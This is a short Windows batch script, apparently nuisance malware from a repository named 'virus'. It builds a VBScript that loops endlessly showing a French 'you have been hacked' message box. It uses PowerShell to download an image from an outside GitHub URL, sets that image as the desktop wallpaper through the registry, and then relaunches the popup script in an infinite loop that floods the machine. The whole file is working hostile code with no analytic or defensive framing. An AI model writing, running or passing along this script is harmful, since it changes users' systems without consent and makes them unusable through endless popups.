@echo off
cd %temp%
md wcs
cd wcs
rem ====================================================================================================
echo do >wcs1.vbs
echo x=msgbox("vous avez ete hacke par wcs skwal", 16+4096, "Vous etes hacke") >>wcs1.vbs
echo loop >>wcs1.vbs
powershell -command "wget https://github.com/WcsSkwal/virus/raw/master/plan.bmp -outfile wcs.bmp"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "C:\Users\%username%\AppData\Local\Temp\wcs\wcs.bmp" /F
timeout 01 /nobreak > nul
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
:wcs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
start wcs1.vbs
timeout 01 /nobreak
goto :wcs




